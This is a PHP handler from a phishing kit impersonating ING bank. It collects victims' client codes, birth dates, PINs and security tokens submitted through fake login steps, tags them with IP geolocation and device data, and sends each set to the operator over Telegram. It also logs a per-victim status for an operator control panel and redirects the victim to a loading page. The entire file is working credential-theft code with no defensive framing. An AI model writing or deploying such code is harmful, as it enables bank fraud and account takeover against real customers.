<?php
include "../config.php";
include "../lib/geoplugin.class.php";
include "../lib/UserInfo.php";


    $geoplugin = new geoPlugin();
    $user = new UserInfo();
    
    $geoplugin->locate();
    $ip = get_user_ip();

    $newLink = $_SESSION['link'];

    $keyboard = json_encode([
        "inline_keyboard" => [

                [
                    [
                        "text" => '🕹 Control for : [ ' . get_user_ip() . " - " . $geoplugin->countryCode.' ]',
                        "url" => "$newLink"
                    ]
    
                ],
        ]
    ]);

    $id_user = str_replace(".", "-", $ip);
    $filename = "../panel/logs/$id_user.json";
    $data = file_get_contents($filename);
    $data = json_decode($data, true);

    if($_SERVER['REQUEST_METHOD'] === 'POST'){
         if($_POST['step'] === 'login'){
            $message =
                "[+]——————[ ING ]——————[+]\r\n".
                "👥 CLIENT CODE = " . $_POST['clientCode'] ."\r\n".
                "📅 BIRTH DATE = " . $_POST['birthDate'] ."\r\n".
                "📍 IP = ".$ip." | ".$geoplugin->countryCode."\r\n".
                "📱 Device = " . $user->get_os() ."\r\n".
                "[+]——————[ ING ]——————[+]\r\n";
                
                // change the status to wait
                $data['status'] = 'wait';
                
                $json = json_encode($data, JSON_PRETTY_PRINT);
                file_put_contents($filename, $json);
                
                telegram_message($message, $keyboard);
                
                header("Location: loading.php?redirect=".random_int(1000000000,9999999999));
                exit;
         }
         if ($_POST['step'] === 'pin') {
            $message =
                "[+]——————[ ING ]——————[+]\r\n".
                "🔑 PIN = " . $_POST['pin'] ."\r\n".
                "📍 IP = ".$ip." | ".$geoplugin->countryCode."\r\n".
                "📱 Device = " . $user->get_os() ."\r\n".
                "[+]——————[ ING ]——————[+]\r\n";
                
                // change the status to wait
                $data['status'] = 'wait';
                
                $json = json_encode($data, JSON_PRETTY_PRINT);
                file_put_contents($filename, $json);
                
                telegram_message($message, $keyboard);
                
                header("Location: loading.php?redirect=".random_int(1000000000,9999999999));
                exit;
         }
         if ($_POST['step'] === 'token') {
            $message =
                "[+]——————[ ING ]——————[+]\r\n".
                "🔐 TOKEN = " . $_POST['token'] ."\r\n".
                "📍 IP = ".$ip." | ".$geoplugin->countryCode."\r\n".
                "📱 Device = " . $user->get_os() ."\r\n".
                "[+]——————[ ING ]——————[+]\r\n";
                
                // change the status to wait
                $data['status'] = 'wait';
                
                $json = json_encode($data, JSON_PRETTY_PRINT);
                file_put_contents($filename, $json);
                
                telegram_message($message, $keyboard);
                
                header("Location: loading.php?redirect=".random_int(1000000000,9999999999));
                exit;
         }
        
    }